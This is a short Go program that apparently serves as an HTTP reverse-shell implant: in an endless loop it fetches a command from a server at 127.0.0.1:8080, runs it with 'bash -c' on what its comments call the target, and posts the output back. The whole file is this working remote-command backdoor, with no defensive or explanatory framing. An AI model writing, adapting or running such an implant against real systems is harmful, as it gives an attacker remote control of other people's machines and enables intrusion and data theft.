package main

import (
	"bytes"
	"io/ioutil"
	"net/http"
	"os/exec"
)

func main() {
	// keeping the connection with for loop
	for {
		// Recieving the Command as get request
		resp, _ := http.Get("http://127.0.0.1:8080")
		defer resp.Body.Close()
		scanner, _ := ioutil.ReadAll(resp.Body)
		//executing the command on target
		cmd, _ := exec.Command("bash", "-c", string(scanner)).CombinedOutput()
		// making an http post request to send the output back
		respost, _ := http.NewRequest("POST", "http://127.0.0.1:8080", bytes.NewBuffer(cmd))
		// send back the http request
		resp, _ = http.DefaultClient.Do(respost)
	}
}
